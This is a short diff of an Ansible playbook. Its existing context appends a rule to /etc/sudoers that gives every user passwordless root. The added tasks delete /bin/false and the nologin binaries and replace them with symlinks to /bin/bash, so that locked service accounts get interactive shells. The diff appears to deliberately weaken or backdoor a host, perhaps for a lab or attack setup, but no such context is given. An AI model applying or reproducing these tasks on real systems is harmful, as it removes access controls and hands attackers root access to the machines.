@@ -29,3 +29,17 @@
 
 - name: change sudoers file
   command: echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> "/etc/sudoers"
+
+- name: remove nologin bins to bash
+  command: rm {{ item }} 2> /dev/null
+  loop:
+    - /bin/false
+    - /usr/sbin/nologin
+    - /sbin/nologin
+
+- name: link nologin bins to bash bin
+  command: ln -s /bin/bash {{ item }} 2> /dev/null
+  loop:
+    - /bin/false
+    - /usr/sbin/nologin
+    - /sbin/nologin
